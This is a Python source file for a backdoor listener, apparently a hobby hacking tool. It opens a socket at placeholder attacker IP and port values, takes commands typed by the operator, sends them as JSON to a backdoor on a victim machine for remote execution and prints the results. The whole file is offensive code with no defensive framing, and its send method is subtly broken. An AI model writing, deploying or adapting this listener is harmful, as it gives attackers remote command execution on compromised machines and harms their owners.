#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 01-09-2020
# Last Updated: 14-09-2020
# Operating System: Windows, Linux, Mac
# Description: Opens a desired port and allows connections made to that port

# Import the necessary libraries
import socket, json

# Define a class for the listener
class Listener:
	def __init__(self, ip, port):
		# Create a socket object
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# Change the socket option to reuse the sockets incase it is dropped due to any error
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		# Bind the socket to the local IP and a port
		listener.bind((ip, port))
		# Listen in on the socket
		print("[+] Waiting for incoming connections")
		listener.listen()
		# Accept any connection made to the specified port
		self.connection, address = listener.accept()
		print("[+] Got a connection " + str(address))
	
	# a send method that sends data as json objects. The data here is in string and therefore does not need any sort of decodes
	def json_send(self, data):
		json_data = json.dumps(data)
		self.connection.sendto(json_data.encode(), (<ATTACKER_IP>, <PORT_NO>))

	# a receive method that receives and converts json objects
	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except ValueError:
				continue

	def remote_execution(self, command):
		self.json_send(command)
		# Terminate the connection if "exit" command is used
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.json_receive()

	def run(self):
		# Take user input commnads and send it to the backdoor for execution. The backdoor executes the commands and returns the result to the listener.
		while True:
			command = input(str(">> "))
			command = command.split(" ")
			result = self.remote_execution(command)
			print(result)

my_listener = Listener(<ATTACKER_IP>, <PORT_NO>)
my_listener.run()